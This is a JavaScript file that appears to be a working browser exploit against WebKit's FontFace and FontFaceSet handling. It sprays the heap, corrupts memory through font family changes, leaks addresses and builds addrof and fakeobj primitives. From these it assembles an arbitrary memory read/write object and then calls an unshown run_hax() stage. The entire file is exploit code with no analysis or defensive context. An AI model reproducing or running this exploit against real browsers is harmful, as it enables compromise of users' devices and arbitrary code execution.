var p;

function poc() {
  const PAGE_SIZE = 16384,
    SIZEOF_CSS_FONT_FACE = 0xB8,
    HASHMAP_BUCKET = 208,
    STRING_OFFSET = 20,
    SPRAY_FONTS = 0x100A,
    GUESS_FONT = 0x200430000,
    NPAGES = 20,
    INVALID_POINTER = 0,
    HAMMER_FONT_NAME = "font8",
    HAMMER_NSTRINGS = 700;

  var union = new ArrayBuffer(8),
    union_b = new Uint8Array(union),
    union_i = new Uint32Array(union),
    union_f = new Float64Array(union),
    bad_fonts = [];

  for (var i = 0; i < SPRAY_FONTS; i++) bad_fonts.push(new FontFace("font1", "", {}));
  var good_font = new FontFace("font2", "url(data:text/html,)", {});
  bad_fonts.push(good_font);
  var arrays = [];
  for (var i = 0; i < 512; i++) arrays.push(new Array(31));
  arrays[256][0] = 1.5;
  arrays[257][0] = {};
  arrays[258][0] = 1.5;

  var jsvalue = { a: arrays[256], b: new Uint32Array(1), c: true },
    string_atomifier = {},
    string_id = 1e7,
    strings = [],
    guf = GUESS_FONT,
    ite = true,
    matches = 0,
    round = 0;

  window.ffses = {};

  do {
    var p_s = ptrToString(NPAGES + 2);
    for (var i = 0; i < NPAGES; i++) p_s += ptrToString(guf + i * PAGE_SIZE);
    p_s += ptrToString(INVALID_POINTER);
    for (var i = 0; i < 256; i++) mkString(HASHMAP_BUCKET, p_s);
    ffses["search_" + ++round] = new FontFaceSet(bad_fonts);

    var badstr1 = mkString(HASHMAP_BUCKET, p_s),
      guessed_addr = null;

    for (var i = 0; i < SPRAY_FONTS; i++) {
      bad_fonts[i].family = "search" + round;

      if (badstr1.substr(0, p_s.length) != p_s) {
        var guessed_font = i,
          p_s1 = badstr1.substr(0, p_s.length);

        for (var i = 1; i <= NPAGES; i++)
          if (p_s1.substr(i * 8, 8) != p_s.substr(i * 8, 8)) {
            guessed_addr = stringToPtr(p_s.substr(i * 8, 8));
            break;
          }

        if (matches++ == 0) {
          guf = guessed_addr + 2 * PAGE_SIZE;
          guessed_addr = null;
        }

        break;
      }
    }

    if (ite = !ite) guf += NPAGES * PAGE_SIZE;
  }
  while (guessed_addr === null);

  p_s = ptrToString(26) + ptrToString(guessed_addr) + ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE);
  for (var i = 0; i < 19; i++) p_s += ptrToString(INVALID_POINTER);
  for (var i = 0; i < 256; i++) mkString(HASHMAP_BUCKET, p_s);
  var needfix = [];

  for (var i = 0;; i++) {
    ffses["ffs_leak_" + i] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], good_font]);
    var badstr2 = mkString(HASHMAP_BUCKET, p_s);
    needfix.push(mkString(HASHMAP_BUCKET, p_s));
    bad_fonts[guessed_font].family = "evil2";
    bad_fonts[guessed_font + 1].family = "evil3";
    var leak = stringToPtr(badstr2.substr(badstr2.length - 8));
    if (leak < 0x1000000000000) break;
  }

  var fastmalloc = makeReader(leak, "ffs3");
  for (var i = 0; i < 1e5; i++) mkString(128, "");
  var props = [];
  for (var i = 0; i < 0x10000; i++) props.push({ value: 0x41434442 }, { value: jsvalue });
  Object.defineProperties({}, props);

  for (var i = fastmalloc.indexOf("\u0042\u0044\u0043\u0041\u0000\u0000\u00fe\u00ff");; i += 16)
    if (fastmalloc.charCodeAt(i) == 0x42 && fastmalloc.charCodeAt(i + 1) == 0x44 && fastmalloc.charCodeAt(i + 2) == 0x43 && fastmalloc.charCodeAt(i + 3) == 0x41 && fastmalloc.charCodeAt(i + 4) == 0 && fastmalloc.charCodeAt(i + 5) == 0 && fastmalloc.charCodeAt(i + 6) == 254 && fastmalloc.charCodeAt(i + 7) == 255 && fastmalloc.charCodeAt(i + 24) == 14) {
      var jsvalue_leak = stringToPtr(fastmalloc, i + 32);
      break;
    }

  var rd_leak = makeReader(jsvalue_leak, "ffs4"),
    array256 = stringToPtr(rd_leak, 16),
    ui32a = stringToPtr(rd_leak, 24),
    rd_arr = makeReader(array256, "ffs5"),
    butterfly = stringToPtr(rd_arr, 8),
    rd_ui32 = makeReader(ui32a, "ffs6");

  for (var i = 0; i < 8; i++) union_b[i] = rd_ui32.charCodeAt(i);

  var structureid_low = union_i[0],
    structureid_high = union_i[1];

  union_i[0] = 0x10000;
  union_i[1] = 0;
  arrays[257][1] = {};
  arrays[257][0] = union_f[0];
  union_i[0] = guessed_addr + 12 * SIZEOF_CSS_FONT_FACE | 0;
  union_i[1] = (guessed_addr - guessed_addr % 0x100000000) / 0x100000000;
  arrays[256][i] = union_f[0];
  pp_s = ptrToString(56);
  for (var i = 0; i < 12; i++) pp_s += ptrToString(guessed_addr + i * SIZEOF_CSS_FONT_FACE);

  var fake_s = "0000" + ptrToString(INVALID_POINTER) + ptrToString(butterfly) + "\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000",
    ffs7_args = [];

  for (var i = 0; i < 12; i++) ffs7_args.push(bad_fonts[guessed_font + i]);
  ffs7_args.push(good_font);
  var ffs8_args = [bad_fonts[guessed_font + 12]];
  for (var i = 0; i < 5; i++) ffs8_args.push(new FontFace(HAMMER_FONT_NAME, "url(data:text/html,)", {}));
  for (var i = 0; i < HAMMER_NSTRINGS; i++) mkString(HASHMAP_BUCKET, pp_s);
  ffses.ffs7 = new FontFaceSet(ffs7_args);
  mkString(HASHMAP_BUCKET, pp_s);
  ffses.ffs8 = new FontFaceSet(ffs8_args);
  var post_ffs = mkString(HASHMAP_BUCKET, fake_s);
  needfix.push(post_ffs);
  for (var i = 0; i < 13; i++) bad_fonts[guessed_font + i].family = "hammer" + i;

  var arw_master = new Uint32Array(8),
    arw_slave = new Uint8Array(1),
    obj_master = new Uint32Array(8),
    obj_slave = { obj: null },
    addrof_slave = boot_addrof(arw_slave),
    addrof_obj_slave = boot_addrof(obj_slave);

  union_i[0] = structureid_low;
  union_i[1] = structureid_high;
  union_b[6] = 7;

  var obj = { jscell: union_f[0], butterfly: true, buffer: arw_master, size: 0x5678 },
    magic = boot_fakeobj(boot_addrof(obj) + 16);

  magic[4] = addrof_slave;
  magic[5] = (addrof_slave - addrof_slave % 0x100000000) / 0x100000000;
  obj.buffer = obj_master;
  magic[4] = addrof_obj_slave;
  magic[5] = (addrof_obj_slave - addrof_obj_slave % 0x100000000) / 0x100000000;
  magic = null;
  var ffs_addr = read_ptr_at(addrof(post_ffs) + 8) - 208;
  write_mem(ffs_addr, read_mem(ffs_addr - 96, 208));

  for (var i = 0; i < needfix.length; i++) {
    var addr = read_ptr_at(addrof(needfix[i]) + 8);
    write_ptr_at(addr, (HASHMAP_BUCKET - 20) * 0x100000000 + 1);
    write_ptr_at(addr + 8, addr + 20);
    write_ptr_at(addr + 16, 0x80000014);
  }

  write_ptr_at(butterfly + 248, 0x1F0000001F);

  var expl_master = new Uint32Array(8),
    expl_slave = new Uint32Array(2),
    addrof_expl_slave = addrof(expl_slave),
    m = fakeobj(addrof(obj) + 16);

  obj.buffer = expl_slave;
  m[7] = 1;
  obj.buffer = expl_master;
  m[4] = addrof_expl_slave;
  m[5] = (addrof_expl_slave - addrof_expl_slave % 0x100000000) / 0x100000000;
  m[7] = 1;

  p = {
    write8: function (addr, value) {
      expl_master[4] = addr.low;
      expl_master[5] = addr.hi;

      if (value instanceof int64) {
        expl_slave[0] = value.low;
        expl_slave[1] = value.hi;
      } else {
        expl_slave[0] = value;
        expl_slave[1] = 0;
      }
    },
    write4: function (addr, value) {
      expl_master[4] = addr.low;
      expl_master[5] = addr.hi;
      expl_slave[0] = value instanceof int64 ? value.low : value;
    },
    read8: function (addr) {
      expl_master[4] = addr.low;
      expl_master[5] = addr.hi;
      return new int64(expl_slave[0], expl_slave[1]);
    },
    read4: function (addr) {
      expl_master[4] = addr.low;
      expl_master[5] = addr.hi;
      return expl_slave[0];
    },
    read1: function (addr) {
      expl_master[4] = addr.low;
      expl_master[5] = addr.hi;
      return expl_slave[0] & 0xFF;
    },
    leakval: function (obj) {
      obj_slave.obj = obj;
      return new int64(obj_master[4], obj_master[5]);
    }
  };

  run_hax();

  function ptrToString(p) {
    var s = "";

    for (var i = 0; i < 8; i++) {
      s += String.fromCharCode(p % 256);
      p = (p - p % 256) / 256;
    }

    return s;
  }

  function stringToPtr(p, o = 0) {
    var ans = 0;
    for (var i = 7; i >= 0; i--) ans = 256 * ans + p.charCodeAt(o + i);
    return ans;
  }

  function mkString(l, head) {
    var s = head + "\u0000".repeat(l - STRING_OFFSET - 8 - head.length) + string_id++;
    string_atomifier[s] = 1;
    strings.push(s);
    return s;
  }

  function makeReader(read_addr, ffs_name) {
    var fake_s = "0000\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff" + ptrToString(read_addr) + ptrToString(0x80000014);
    p_s = ptrToString(29) + ptrToString(guessed_addr) + ptrToString(guessed_addr + SIZEOF_CSS_FONT_FACE) + ptrToString(guessed_addr + 2 * SIZEOF_CSS_FONT_FACE);
    for (var i = 0; i < 18; i++) p_s += ptrToString(INVALID_POINTER);
    for (var i = 0; i < 256; i++) mkString(HASHMAP_BUCKET, p_s);
    ffses[ffs_name] = new FontFaceSet([bad_fonts[guessed_font], bad_fonts[guessed_font + 1], bad_fonts[guessed_font + 2], good_font]);
    mkString(HASHMAP_BUCKET, p_s);
    var relative_read = mkString(HASHMAP_BUCKET, fake_s);
    bad_fonts[guessed_font].family = ffs_name + "_evil1";
    bad_fonts[guessed_font + 1].family = ffs_name + "_evil2";
    bad_fonts[guessed_font + 2].family = ffs_name + "_evil3";
    needfix.push(relative_read);
    return relative_read.length < 1e3 ? makeReader(read_addr, ffs_name + "_") : relative_read;
  }

  function boot_addrof(obj) {
    arrays[257][32] = obj;
    union_f[0] = arrays[258][0];
    return union_i[1] * 0x100000000 + union_i[0];
  }

  function boot_fakeobj(addr) {
    union_i[0] = addr;
    union_i[1] = (addr - addr % 0x100000000) / 0x100000000;
    arrays[258][0] = union_f[0];
    return arrays[257][32];
  }

  function i48_put(x, a) {
    a[4] = x | 0;
    a[5] = x / 4294967296 | 0;
  }

  function i48_get(a) {
    return a[4] + a[5] * 4294967296;
  }

  function addrof(x) {
    obj_slave.obj = x;
    return i48_get(obj_master);
  }

  function fakeobj(x) {
    i48_put(x, obj_master);
    return obj_slave.obj;
  }

  function read_mem_setup(p, sz) {
    i48_put(p, arw_master);
    arw_master[6] = sz;
  }

  function read_mem(p, sz) {
    read_mem_setup(p, sz);
    var arr = [];
    for (var i = 0; i < sz; i++) arr.push(arw_slave[i]);
    return arr;
  }

  function write_mem(p, data) {
    read_mem_setup(p, data.length);
    for (var i = 0; i < data.length; i++) arw_slave[i] = data[i];
  }

  function read_ptr_at(p) {
    var ans = 0,
      d = read_mem(p, 8);

    for (var i = 7; i >= 0; i--) ans = 256 * ans + d[i];
    return ans;
  }

  function write_ptr_at(p, d) {
    var arr = [];

    for (var i = 0; i < 8; i++) {
      arr.push(d & 0xFF);
      d /= 256;
    }

    write_mem(p, arr);
  }
}
